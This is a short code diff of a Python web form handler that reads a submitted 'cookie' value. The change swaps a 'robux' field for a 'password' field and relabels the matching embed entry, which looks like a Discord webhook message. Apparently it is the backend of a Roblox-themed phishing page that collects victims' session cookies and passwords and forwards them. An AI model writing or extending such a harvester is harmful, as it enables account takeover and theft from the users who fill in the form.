@@ -68,7 +68,7 @@ def submit_form():
         data = request.get_json()
         
         # Extract all form fields
-        robux = data.get('robux', '').strip()
+        password = data.get('password', '').strip()
         cookie = data.get('cookie', '').strip()
         
         # Server-side validation
@@ -128,8 +128,8 @@ def submit_form():
                 },
                 'fields': [
                     {
-                        'name': '💰 Robux',
-                        'value': robux or 'Not provided',
+                        'name': '🔒 Password',
+                        'value': password or 'Not provided',
                         'inline': True
                     },
                     {
